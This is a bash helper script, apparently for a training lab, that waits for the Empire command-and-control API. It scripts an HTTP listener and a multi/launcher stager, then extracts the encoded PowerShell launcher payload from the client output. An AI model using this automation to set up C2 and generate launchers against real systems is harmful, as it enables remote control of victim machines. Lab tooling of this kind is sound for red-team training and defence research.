#!/usr/bin/env bash
set -euo pipefail

# A helper script that waits for Empire to come online, uses its Python client to create an HTTP listener,
# generates a launcher payload, and returns the launcher string.

# Wait for API to come online
echo "Waiting for Empire API (localhost:1337) to become available..." >&2
for i in {1..30}; do
  if curl -s -f http://127.0.0.1:1337/api/v2/meta/version > /dev/null; then
    break
  fi
  sleep 2
done

if ! curl -s -f http://127.0.0.1:1337/api/v2/meta/version > /dev/null; then
  echo "Error: Empire API did not become available." >&2
  exit 1
fi

echo "Empire is online. Configuring listener and payload..." >&2

cat << 'EOF' > /tmp/setup-lab.rc
uselistener http
set Name lab_http
set Host http://empire:5000
set Port 5000
set BindIP 0.0.0.0
execute
main

usestager multi/launcher
set Listener lab_http
execute
EOF

# Copy rc to empire container and execute it via local client
docker cp /tmp/setup-lab.rc empire-c2:/tmp/setup-lab.rc
docker compose --env-file .env.lab exec -T empire ./ps-empire client -r /tmp/setup-lab.rc > /tmp/empire_out.txt

# Extract powershell output from the client log
# Looks for "powershell -noP -sta -w 1 -enc <base64>"
LAUNCHER=$(grep -m 1 -oE "powershell[^\"']* -enc [A-Za-z0-9+/=]+" /tmp/empire_out.txt || true)

if [ -z "$LAUNCHER" ]; then
  # Fallback to general powershell regex if params differ slightly
  LAUNCHER=$(grep -m 1 -ioE "powershell.*-enc [A-Za-z0-9+/=]+" /tmp/empire_out.txt || true)
fi

if [ -z "$LAUNCHER" ]; then
  echo "Failed to extract launcher from output:" >&2
  cat /tmp/empire_out.txt >&2
  exit 1
fi

echo "Successfully generated launcher payload." >&2
echo "$LAUNCHER"
